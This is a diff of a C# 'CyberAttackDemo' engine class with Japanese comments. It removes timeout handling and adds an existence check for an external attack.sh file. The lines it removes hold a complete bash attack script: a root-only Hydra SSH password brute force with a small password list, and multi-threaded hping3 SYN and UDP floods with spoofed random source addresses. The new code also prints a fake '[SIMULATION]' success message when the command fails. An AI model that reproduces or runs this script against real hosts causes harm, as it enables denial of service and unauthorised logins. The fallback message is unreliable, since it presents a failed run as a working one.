@@ -1,19 +1,19 @@
 using System;
 using System.Diagnostics;
 using System.IO;
-using System.Text;
-using System.Threading;
 using System.Threading.Tasks;
 
 namespace CyberAttackDemo
 {
     public class AttackEngine
     {
+        // ログ出力イベント（UIに通知するため）
         public event Action<string>? OnLogReceived;
         
         public const string AttackScriptName = @"./Attack/attack.sh";
 
-        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
+        // 外部コマンド実行
+        public async Task RunCommandAsync(string command, string args)
         {
             try
             {
@@ -24,60 +24,52 @@ namespace CyberAttackDemo
                     RedirectStandardOutput = true,
                     RedirectStandardError = true,
                     UseShellExecute = false,
-                    CreateNoWindow = true,
-                    StandardOutputEncoding = Encoding.UTF8,
-                    StandardErrorEncoding = Encoding.UTF8
+                    CreateNoWindow = true
                 };
 
                 using var process = new Process { StartInfo = psi };
 
+                // 標準出力
                 process.OutputDataReceived += (s, e) => 
                 {
-                    if (!string.IsNullOrEmpty(e.Data))
+                    if (e.Data != null)
                     {
+                        // ここで翻訳ロジックを通す
                         string translated = LogTranslator.Translate(e.Data);
                         OnLogReceived?.Invoke(translated);
                     }
                 };
                 
+                // エラー出力
                 process.ErrorDataReceived += (s, e) =>
                 {
-                    if (!string.IsNullOrEmpty(e.Data))
-                    {
-                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
-                    }
+                    if (e.Data != null) OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                 };
 
-                if (process.Start())
-                {
-                    process.BeginOutputReadLine();
-                    process.BeginErrorReadLine();
+                process.Start();
+                process.BeginOutputReadLine();
+                process.BeginErrorReadLine();
 
-                    if (timeoutSeconds > 0)
-                    {
-                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
-                        try
-                        {
-                            await process.WaitForExitAsync(cts.Token);
-                        }
-                        catch (OperationCanceledException)
-                        {
-                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill...");
-                            try { process.Kill(true); } catch { }
-                        }
-                    }
-                    else
-                    {
-                        await process.WaitForExitAsync();
-                    }
-                }
+                await process.WaitForExitAsync();
             }
             catch (Exception ex)
             {
-                OnLogReceived?.Invoke($"[ERROR] Execution Failed: {ex.Message}");
+                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
+                
+                // デモ用フォールバックメッセージ
+                await Task.Delay(1000);
+                if (command.Contains("bash") || args.Contains("attack.sh"))
+                {
+                     OnLogReceived?.Invoke("[SIMULATION] Executing shell script sequence...");
+                }
+                else
+                {
+                    OnLogReceived?.Invoke("Target appears to be secure or tool not installed.");
+                }
             }
         }
 
+        // 攻撃用シェルスクリプトの存在確認（自動生成は削除）
         public async Task EnsureAttackScriptExistsAsync()
         {
             try
@@ -89,84 +81,25 @@ namespace CyberAttackDemo
                     OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                 }
 
-                // 機能更新のため、常に上書きする設定に変更
-                // if (!File.Exists(AttackScriptName)) 
+                // ファイルが存在するか確認するだけに変更（上書きしない）
+                if (File.Exists(AttackScriptName))
                 {
-                    string scriptContent = @"#!/bin/bash
-
-# root権限チェック
-if [ ""$EUID"" -ne 0 ]; then
-  echo ""エラー: root権限で実行してください。""
-  exit 1
-fi
-
-TARGET_IP=${1:-""127.0.0.1""}
-DURATION=${2:-""15""}
-MODE_ARG=${3:-""dos""}
-SSH_USER=${4:-""root""}
-
-PORT=80
-THREADS=4
-
-cleanup() {
-    echo """"
-    echo ""[!] 停止シグナルを受信しました。プロセスを停止中...""
-    pkill -P $$ hping3
-    pkill -P $$ hydra
-    echo ""[*] 完了。""
-    exit
-}
-
-trap cleanup SIGINT SIGTERM EXIT
-
-echo ""==========================================""
-echo ""   Cyber Attack Simulator Script""
-echo ""==========================================""
-echo ""[*] TARGET: $TARGET_IP""
-echo ""[*] DURATION: $DURATION sec""
-echo ""[*] MODE: $MODE_ARG""
-echo ""------------------------------------------""
-
-if [ ""$MODE_ARG"" = ""hydra"" ]; then
-    # --- Hydra SSH Crack ---
-    echo ""[*] Starting Hydra SSH Password Cracking...""
-    echo ""[*] Target User: $SSH_USER""
-    
-    # デモ用パスワードリスト作成
-    echo ""123456"" > passlist.txt
-    echo ""password"" >> passlist.txt
-    echo ""admin"" >> passlist.txt
-    echo ""root"" >> passlist.txt
-    echo ""kali"" >> passlist.txt
-    
-    # Hydra実行 (ユーザー名を引数から指定)
-    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
-    
-    rm passlist.txt
-
-else
-    # --- DoS Attack (hping3) ---
-    echo ""[*] Starting DoS Flood Attack...""
-    
-    for (( i=1; i<=THREADS; i++ ))
-    do
-        # TCP SYN Flood
-        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
-        # UDP Flood
-        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
-    done
-    
-    wait
-fi
-";
-                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
+                    OnLogReceived?.Invoke($"[SYSTEM] Loaded attack script: {AttackScriptName}");
+                    
+                    // 念のため実行権限を付与
                     try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
-                    OnLogReceived?.Invoke($"[SYSTEM] Updated attack script: {AttackScriptName}");
                 }
+                else
+                {
+                    OnLogReceived?.Invoke($"[WARNING] Attack script not found at: {AttackScriptName}");
+                    OnLogReceived?.Invoke($"[WARNING] Please place your 'attack.sh' file in the 'Attack' folder.");
+                }
+                
+                await Task.CompletedTask;
             }
             catch (Exception ex)
             {
-                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
+                OnLogReceived?.Invoke($"[ERROR] Failed to check script: {ex.Message}");
             }
         }
     }
